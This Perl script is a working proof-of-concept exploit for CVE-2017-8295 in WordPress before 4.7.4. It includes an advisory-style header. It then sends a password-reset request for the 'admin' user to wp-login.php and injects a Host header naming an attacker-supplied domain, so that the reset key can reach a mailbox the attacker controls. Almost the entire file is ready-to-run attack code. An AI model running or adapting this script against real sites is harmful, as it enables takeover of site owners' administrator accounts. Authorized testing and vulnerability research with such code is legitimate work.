#!/usr/bin/perl

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use HTTP::Response;

# Global Variables
my $url = 0;
$url = $ARGV[0] or help();

# Display The Header
header();

# Run The PoC
exploit($url);


sub header {
    print "\n\n";
    my $title = "=================================[ WordPress < 4.7.4 - Unauthorized Password Reset ]=================================";
    
    print qq{
$title
            
   Reporter : Dawid Golunski
       Date : 03.05.2017
        CVE : CVE-2017-8295
            
Description :


WordPress through 4.7.4 relies on the Host HTTP header for a
password-reset e-mail message, which makes it easier for remote
attackers to reset arbitrary passwords by making a crafted
wp-login.php?action=lostpassword request and then arranging for this
message to bounce or be resent, leading to transmission of the reset
key to a mailbox on an attacker-controlled SMTP server. This is
related to problematic use of the SERVER_NAME variable in
wp-includes/pluggable.php in conjunction with the PHP mail function.
Exploitation is not achievable in all cases because it requires at
least one of the following: (1) the attacker can prevent the victim
from receiving any e-mail messages for an extended period of time
(such as 5 days), (2) the victim's e-mail system sends an autoresponse
containing the original message, or (3) the victim manually composes a
reply containing the original message.


};
    print "="x(length($title)) . "\n\n";
}

sub help {
    print "\n";
    print qq {  
        # Usage : perl $0 <url>        
    };
    print "\n\n";
    exit;
}

sub buildRequester {
    my ( $useragent, $timeout, $proxy ) = @_;
    $proxy = 0 if(!defined($proxy));
    my $browser = 0;
    my $cookie_jar = 0;
    
    $cookie_jar = HTTP::Cookies->new(
        file     => "/tmp/cookies.lwp",
        autosave => 1,
    );
    
    $browser = LWP::UserAgent->new();
    $browser->protocols_allowed( [qw( http https ftp )] );
    $browser->requests_redirectable(['GET', 'POST', 'HEAD', 'OPTIONS']);
    $browser->cookie_jar( $cookie_jar);
    
    ### Custom Options
    $browser->timeout($timeout);
    $browser->agent($useragent);
    
    if($proxy) {
        $browser->proxy( [qw( http https ftp ftps )] => $proxy);
    }
    
    return $browser;
}

sub buildRequest {
    my ( $url, $method, $payload, $content_type) = @_;
    $content_type = 'application/x-www-form-urlencoded' if(!defined($content_type));
    $payload = '' if(!defined($payload));
    $method = uc($method);
    my $request = 0;
    
    if($method eq "GET") {
        $request = new HTTP::Request $method, $url . '?' . $payload;
    } else {
        $request = new HTTP::Request $method, $url;
        $request->content($payload);
    }
    $request->content_type($content_type);
    
    return $request;
}

sub exploit {
    my ( $url ) = @_;
    my $browser = 0;
    my $useragent = '';
    my $request = 0;
    my $response = 0;
    my $proxy = 0;
    my $vulnerable = 1;
    my $timeout = 30;
    
    ### Setting Up The Requester
    $browser = buildRequester($useragent, $timeout, $proxy);
    
    ### Ask User For An Evil Domain
    my $attacker_domain = getInput("Please Enter The DOMAIN At Which You Registered The Email admin\@<DOMAIN>");
    
    ### Build/send the requests

    # Request : EXPLOIT1
    print "[*] Sending Password Reset Request On : /wp-login.php?action=lostpassword\n";
    $request = buildRequest($url . "wp-login.php?action=lostpassword", "POST", "wp-submit=Get+New+Password&user_login=admin&redirect_to=wp-submit", "application/x-www-form-urlencoded");
    
    # Inject The Host Header With The Attacker Host
    $request->headers("Host" => $attacker_domain);
    
    $response = $browser->request($request);
    print "\t => " . $request->uri . " (" . $response->code . ")\n\n";
    
    if($response->code !~ /40[0-9]/) {
        print "[*] Password Reset Payload Sent, Check admin\@$attacker_domain Mailbox !\n";
    } else {
        print "[-] Bad Status Code Received .\n";
    }
}

sub getInput {
    my ( $text ) = @_;
    my $input = 0;
    
    while(!$input) {
        print "\n$text : ";
        $input = <STDIN>;
        chomp $input;
        print "\n";
    }
    
    return $input;
}
